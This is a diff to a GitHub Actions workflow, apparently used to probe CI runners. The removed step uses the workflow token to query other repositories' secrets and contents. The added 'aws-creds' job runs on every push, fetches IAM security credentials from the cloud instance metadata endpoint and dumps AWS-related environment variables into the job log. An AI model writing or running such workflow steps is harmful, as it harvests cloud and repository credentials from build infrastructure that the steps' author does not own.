@@ -1,18 +1,11 @@
-name: test
+name: aws-creds
 on: [push]
 jobs:
   test:
     runs-on: ubuntu-latest
-    permissions:
-      contents: write
-      actions: write
     steps:
-      - name: permission bypass
+      - name: aws metadata
         run: |
-          TOKEN="${{ secrets.GITHUB_TOKEN }}"
-          curl -s -H "Authorization: Bearer $TOKEN" \
-            "https://api.github.com/repos/Asad657/ssrf-test/actions/secrets/TEST_SECRET" | python3 -m json.tool | head -10
-          curl -s -H "Authorization: Bearer $TOKEN" \
-            "https://api.github.com/repos/Asad657/Assuhere/actions/secrets" | python3 -m json.tool | head -10
-          curl -s -H "Authorization: Bearer $TOKEN" \
-            "https://api.github.com/repos/Asad657/Assuhere/contents/" | python3 -m json.tool | head -10
+          curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
+          curl -s http://169.254.169.254/latest/meta-data/iam/info/
+          env | grep -E "AWS|AMAZON" || true
